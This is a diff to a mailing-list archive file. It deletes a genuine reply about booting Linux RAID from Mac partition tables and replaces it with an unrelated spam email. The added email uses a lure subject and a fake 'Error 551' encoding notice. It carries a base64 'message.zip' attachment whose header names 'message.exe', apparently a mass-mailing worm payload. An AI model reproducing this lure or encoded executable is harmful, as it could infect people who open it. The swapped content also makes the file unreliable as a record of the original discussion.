@@ -1,54 +1,94 @@
-From: Sven Luther <sven.luther@wanadoo.fr>
-Subject: Re: Root Drive Mirroring and LVM.
-Date: Tue, 27 Jan 2004 10:32:13 +0100
-Sender: owner-linuxppc-dev@lists.linuxppc.org
-Message-ID: <20040127093213.GA10049@iliana>
-References: <868055F9-5045-11D8-8066-00039382032A@mindspring.com> <200401270801.i0R81HdT022197@kruuna.Helsinki.FI>
+From: stu@tco.net
+Subject: I still love you  ieUtO
+Date: Tue, 27 Jan 2004 22:23:28 +0000
+Sender: linux-raid-owner@vger.kernel.org
+Message-ID: <560HDFL97D1D09I8@tco.net>
+References: <89J50244A9F12138@vger.kernel.org>
 Mime-Version: 1.0
-Content-Type: text/plain; charset=iso-8859-1
-Return-path: <owner-linuxppc-dev@lists.linuxppc.org>
-Content-Disposition: inline
-In-Reply-To: <200401270801.i0R81HdT022197@kruuna.Helsinki.FI>
-To: Atro.Tossavainen@helsinki.fi
-Cc: linuxppc-dev@lists.linuxppc.org, linux-raid@vger.kernel.org, tas@mindspring.com
+Content-Type: multipart/mixed; boundary="----=_NextPart_B1FEC_00CC10AEE64BFI2685K"
+Return-path: <linux-raid-owner@vger.kernel.org>
+In-Reply-To: <89J50244A9F12138@vger.kernel.org>
+To: Linux-raid <linux-raid@vger.kernel.org>
 List-Id: linux-raid.ids
 
+------=_NextPart_B1FEC_00CC10AEE64BFI2685K
+Content-Type: text/plain
+Content-Transfer-Encoding: 8bit
 
-On Tue, Jan 27, 2004 at 10:01:17AM +0200, Atro Tossavainen wrote:
->
-> Sorry about the crossposting.
->
-> I wrote on the Yellow Dog Linux list when somebody asked about software
-> RAID on YDL about my experiences with it:
->
-> >> The one really big gotcha is that the Macintosh partitioning scheme
-> >> can't tell the Linux kernel that certain partitions are to be
-> >> considered "Linux RAID autodetect" (as in x86 using the DOS partition
-> >> table type 0xfd). This means that you can't boot a Mac Linux system
-> >> directly from RAID because the kernel won't be able to autostart the
-> >> RAID devices. You have to work around this by creating an initial RAM
-> >> disk that uses the raidstart command to start your metadevices, then
-> >> swaps the initrd out of the way and proceeds to start the real system.
->
-> to which Tim Seufert replied on the same list:
->
-> > Hmmm.  That would seem to be a lack in the Linux RAID code, since the
-> > Macintosh partition table has a vastly more flexible partition type
-> > field than DOS: instead of a single byte it's a string.  It would mean
-> > breaking from the convention of using the "Apple_SVR2_UNIX" type for
-> > Linux partitions, but that really is just a convention as far as I know.
->
-> Perhaps the PPC Linux developers and the Linux RAID developers should
-> get together on this and make some decisions so as to make it happen.
+Error 551: We are sorry your UTF-8 encoding is not supported by the server, so the text was automatically zipped and attached to this message.
 
-Seems ok for me. Also, i guess that there are other partition types,
-like the amiga partitition table the pegasos boxes mostly use, which has
-a 32bit identifier for partition types. I guess it is the task of the
-RAID code to have some per partition type checking for this RAID autodetect
-magic.
+------=_NextPart_B1FEC_00CC10AEE64BFI2685K
+Content-Type: text/plain; name="message.zip"
+Content-Transfer-Encoding: base64
+Content-Disposition: attachment; filename="message.zip"
+Content-ID: <message.zip>
 
-Friendly,
+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
 
-Sven Luther
+------=_NextPart_B1FEC_00CC10AEE64BFI2685K--
 
-** Sent via the linuxppc-dev mail list. See http://lists.linuxppc.org/
